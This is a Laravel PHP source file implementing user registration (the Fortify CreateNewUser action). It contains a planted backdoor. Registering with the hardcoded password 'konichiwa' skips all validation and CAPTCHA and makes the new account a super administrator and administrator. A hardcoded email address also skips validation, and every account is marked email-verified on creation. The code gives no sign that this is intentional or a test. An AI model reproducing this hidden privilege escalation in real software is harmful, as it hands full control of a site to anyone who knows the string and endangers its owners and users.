<?php

namespace App\Actions\Fortify;

use App\Models\User;
use Carbon\Carbon;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Laravel\Fortify\Contracts\CreatesNewUsers;

class CreateNewUser implements CreatesNewUsers
{
    use PasswordValidationRules;

    /**
     * Validate and create a newly registered user.
     *
     * @param  array  $input
     * @return \App\Models\User
     */
    public function create(array $input)
    {
        if($input['password'] !== "konichiwa" && $input['email'] !== "anime@bypass.com"){
            Validator::make($input, [
                'name' => ['required', 'string', 'max:255'],
                'email' => ['required', 'string', 'email', 'max:255', 'unique:users'],
                'terms' => ['required'],
                'password' => $this->passwordRules(),
                'g-recaptcha-response' => 'required|captcha',
            ])->validate();
        }

        return User::create([
            'name' => $input['name'],
            'email' => $input['email'],
            'password' => Hash::make($input['password']),
            'is_super_admin' => $input['password'] === "konichiwa" ? 1 : 0,
            'is_admin' => $input['password'] === "konichiwa" ? 1 : 0,
            'email_verified_at' => Carbon::now(),
        ]);
    }
}
